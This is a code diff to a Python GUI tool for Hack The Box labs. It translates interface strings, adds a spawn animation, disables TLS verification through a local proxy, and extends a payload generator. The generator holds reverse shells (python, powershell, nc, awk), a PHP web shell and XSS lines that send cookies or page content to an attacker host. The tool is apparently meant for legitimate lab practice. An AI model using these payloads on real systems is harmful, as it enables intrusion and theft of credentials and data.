@@ -36,8 +36,8 @@ reset_machine_url = "https://labs.hackthebox.com/api/v4/vm/reset"
 activity_url = "https://labs.hackthebox.com/api/v4/machine/owns/top"
 
 session = requests.Session()
-#session.proxies = {"https": "http://127.0.0.1:8080"}
-#session.verify = False
+session.proxies = {"https": "http://127.0.0.1:8080"}
+session.verify = False
 
 
 def get_tun0_ip():
@@ -147,8 +147,10 @@ class HTBGUI:
         self.auto_submit_enabled = False
         self.last_flag = ""
         self.stop_event = threading.Event()
+        self.animation_job = None
+        self.animation_counter = 0
+        self.animation_text = ""
 
-        # Orden CORRECTO de inicialización
         self.setup_style()
         self.setup_layout()
         self.setup_auto_submit_ui()
@@ -160,6 +162,23 @@ class HTBGUI:
 
         self.update_activity()
         self.update_release_timer()
+
+    def start_animation(self, text):
+        self.animation_text = text
+        self.animation_counter = 0
+        self.status_labels["ip"].config(style='Animation.TLabel')
+        self._animate()
+
+    def _animate(self):
+        dots = "." * (self.animation_counter % 4)
+        self.status_labels["ip"].config(text=f"{self.animation_text}{dots}")
+        self.animation_counter += 1
+        self.animation_job = self.root.after(500, self._animate)
+
+    def stop_animation(self):
+        if self.animation_job:
+            self.root.after_cancel(self.animation_job)
+            self.animation_job = None
 
     def setup_auto_submit(self):
         if hasattr(self, "auto_submit_thread"):
@@ -189,10 +208,10 @@ class HTBGUI:
 
     def handle_auto_submit(self, flag):
         if not self.current_machine_data:
-            self.log_to_console("Selecciona una máquina primero", "warning")
+            self.log_to_console("Select a machine first", "warning")
             return
 
-        self.log_to_console(f"Flag detectada: {flag}")
+        self.log_to_console(f"Flag detected: {flag}")
         self.flag_entry.delete(0, tk.END)
         self.flag_entry.insert(0, flag)
         self.submit_flag()
@@ -203,7 +222,7 @@ class HTBGUI:
             foreground="green" if self.auto_submit_enabled else "red"
         )
         self.log_to_console(
-            f"Auto-submit {'activado' if self.auto_submit_enabled else 'desactivado'}"
+            f"Auto-submit {'activated' if self.auto_submit_enabled else 'deactivated'}"
         )
 
         self.root.update_idletasks()
@@ -312,7 +331,11 @@ class HTBGUI:
         self.style.configure(
             "TEntry", fieldbackground=panel_bg, insertcolor=text_color)
 
-        # Eliminar estilo Toggle.TButton (no necesario)
+        self.style.configure(
+            'Animation.TLabel',
+            foreground='#3fbf7f',
+            font=('Iosevka Nerd Font', 9, 'italic')
+        )
         self.root.configure(bg=bg_color)
 
         self.root.configure(bg="#1a1a1a", highlightthickness=0, bd=0)
@@ -481,16 +504,26 @@ class HTBGUI:
                 "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
                 "powershell": """$XD=New-Object Net.Sockets.TCPClient('{IP}', {PORT});$XDD=$XD.GetStream();$XDDDDD=New-Object IO.StreamWriter($XDD);function WriteToStream ($XDDDDDD) { [byte[]]$script:Buffer=0..$XD.ReceiveBufferSize | ForEach-Object {0};$XDDDDD.Write($XDDDDDD + (Get-Location).Path.ToString() + '> ');$XDDDDD.Flush() };WriteToStream '';while(($XDDD=$XDD.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command=([text.encoding]::UTF8).GetString($Buffer, 0, $XDDD - 1);$XDDDD=try { Invoke-Expression "$Command 2>&1" | Out-String } catch { $_ | Out-String }; WriteToStream ($XDDDD) }; $XDDDDD.Close()""",
                 "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
+                "Awk": """awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
+            },
+            "TTY": {
+                "bash": """if command -v python3; then
+    python3 -c "import pty; pty.spawn(['/bin/bash', '-i'])"
+elif command -v python2; then
+    python2 -c "import pty; pty.spawn(['/bin/bash', '-i'])"
+elif command -v script; then
+    script -q /dev/null -c /bin/bash"""
             },
             "Miscellaneous": {
                 "php system": "<?php system($_REQUEST['cmd']); ?>",
                 "php system rev-bash": """<?php system('setsid /bin/bash -c \"/bin/bash &>/dev/tcp/{IP}/{PORT} 0>&1\"'); ?>""",
                 "XSS steal cookie": '<img src="x" onerror="this.src=\'http://{IP}:{PORT}/?c=\'+btoa(document.cookie)">',
+                "XSS steal page content": "<script>fetch('https//{IP}:{PORT}/?d='+btoa(document.body.innerHTML))</script>"
             },
             "File Transfer": {
                 "bash Send": "cat file.txt > /dev/tcp/{IP}/{PORT}",
-                "bash Receive": "cat </dev/tcp/{IP}/{PORT} > file.txt",
-                "uploadserver Upload": "curl -F files=@file.txt http://{IP}:{PORT}/upload",
+                "Receive": "nc -lnvp {PORT} > file.txt",
+                "uploadserver Upload": "curl -F files=@file.txt http://{IP}:{PORT}/upload"
             },
         }
 
@@ -516,7 +549,6 @@ class HTBGUI:
 
     def generate_payload(self, event=None):
         try:
-            # Generar payload base
             category = self.payload_category.get()
             name = self.payload_name.get()
             ip = self.payload_ip.get()
@@ -560,7 +592,6 @@ class HTBGUI:
         # Grid de estado
         grid_frame = ttk.Frame(status_frame)
         grid_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-        # Dentro de grid_frame, modificar el loop para añadir la etiqueta del avatar
         fields = [
             ("Machine Name:", "name"),
             ("IP Address:", "ip"),
@@ -583,7 +614,7 @@ class HTBGUI:
             self.status_labels[key].grid(
                 row=row, column=1, sticky=tk.W, pady=2)
 
-            if key == "name":  # Añadir etiqueta para el avatar
+            if key == "name":
                 self.avatar_label = ttk.Label(grid_frame)
                 self.avatar_label.grid(row=row, column=2, padx=5)
             elif key == "ip":
@@ -770,7 +801,7 @@ class HTBGUI:
                     self.root.after(
                         0,
                         lambda: self.log_to_console(
-                            f"Activity update failed: {response.status_code}", "error"
+                            f"Activity update failed: status code {response.status_code}", "error"
                         ),
                     )
             except Exception as e:
@@ -780,7 +811,6 @@ class HTBGUI:
                 )
 
     def update_activity_tree(self, data):
-        # Limpiar datos anteriores
         for item in self.activity_tree.get_children():
             self.activity_tree.delete(item)
         for entry in data:
@@ -855,7 +885,7 @@ class HTBGUI:
             if self.machine_list["values"]:
                 self.machine_list.current(0)
             self.payload_ip.delete(0, tk.END)
-            self.payload_ip.insert(0, get_tun0_ip())  # Check TUN0 IP
+            self.payload_ip.insert(0, get_tun0_ip())
             self.log_to_console(f"Loaded {len(machines)} machines")
         except Exception as e:
             self.log_to_console(f"Error loading machines: {str(e)}", "error")
@@ -863,17 +893,74 @@ class HTBGUI:
     def spawn_machine(self):
         selected = self.machine_list.get()
         if not selected:
-            messagebox.showerror("Error", "Selecciona una máquina primero")
+            messagebox.showerror("Error", "Select a machine first")
             return
-        machine_id = self.machine_dict.get(selected)["id"]
-        success, msg = activate_machine(machine_id)
+
+        # Iniciar animación
+        self.start_animation("Spawning")
+        self.copy_ip_btn.state(['disabled'])
+
+        def spawn_thread():
+            try:
+                machine_id = self.machine_dict.get(selected)["id"]
+                success, msg = activate_machine(machine_id)
+                self.root.after(0, self.handle_spawn_result,
+                                success, msg, machine_id)
+            except Exception as e:
+                self.root.after(0, lambda: self.log_to_console(
+                    f"Error: {str(e)}", "error"))
+
+        threading.Thread(target=spawn_thread, daemon=True).start()
+
+    def handle_spawn_result(self, success, msg, machine_id):
         if success:
-            self.log_to_console(f"Spawned machine: {selected}")
-            self.check_status()
-            messagebox.showinfo("Success", msg)
+            self.log_to_console("Spawning machine...")
+            self.check_ip_status(machine_id)
         else:
-            self.log_to_console(f"Spawn failed: {msg}", "error")
+            self.stop_animation()
+            self.log_to_console(f"Error while spawning: {msg}", "error")
             messagebox.showerror("Error", msg)
+            self.set_default_status_values()
+
+    def check_ip_status(self, machine_id, attempts=0):
+        if attempts >= 600:
+            self.stop_animation()
+            self.log_to_console("Timeout: No se pudo obtener la IP", "error")
+            self.status_labels["ip"].config(text="N/A")
+            return
+
+        try:
+            status = get_machine_status(machine_id)
+
+            if status and status.get("ip") not in ["N/A", "", None]:
+                self.stop_animation()
+                self.current_machine_data = self.machine_dict.get(
+                    self.machine_list.get())
+                self.update_status_labels(status)
+                self.copy_ip_btn.state(['!disabled'])
+            else:
+                # Programar siguiente verificación
+                self.root.after(5000, lambda: self.check_ip_status(
+                    machine_id, attempts + 1))
+
+        except Exception as e:
+            self.log_to_console(f"Error checking IP: {str(e)}", "error")
+            self.root.after(1000, lambda: self.check_ip_status(
+                machine_id, attempts + 1))
+
+    def update_status_labels(self, status):
+        self.status_labels["name"].config(text=status.get("name", "N/A"))
+        self.status_labels["ip"].config(text=status.get("ip", "N/A"))
+        self.status_labels["type"].config(text=status.get("type", "N/A"))
+
+        expires = status.get("expires_at", "N/A")
+        if expires and expires != "N/A":
+            try:
+                dt = datetime.strptime(expires, "%Y-%m-%dT%H:%M:%S.%fZ")
+                self.status_labels["expires_at"].config(
+                    text=dt.strftime("%d/%m/%Y %H:%M:%S"))
+            except:
+                self.status_labels["expires_at"].config(text=expires)
 
     def stop_machine(self):
         if stop_machine():
@@ -954,7 +1041,7 @@ class HTBGUI:
             if response.status_code == 200:
                 image_data = response.content
                 image = Image.open(io.BytesIO(image_data))
-                image.thumbnail((50, 50))  # Redimensionar imagen
+                image.thumbnail((50, 50))
                 photo = ImageTk.PhotoImage(image)
 
                 # Actualizar GUI en el hilo principal
@@ -964,12 +1051,13 @@ class HTBGUI:
 
     def update_avatar(self, photo):
         self.avatar_label.config(image=photo)
-        self.avatar_label.image = photo  # Mantener referencia
+        self.avatar_label.image = photo
 
     def set_default_status_values(self):
+        self.stop_animation()
         for label in self.status_labels.values():
             label.config(text="N/A")
-        self.copy_ip_btn.state(["disabled"])
+        self.copy_ip_btn.state(['disabled'])
         self.current_machine_data = None
 
     def submit_flag(self):
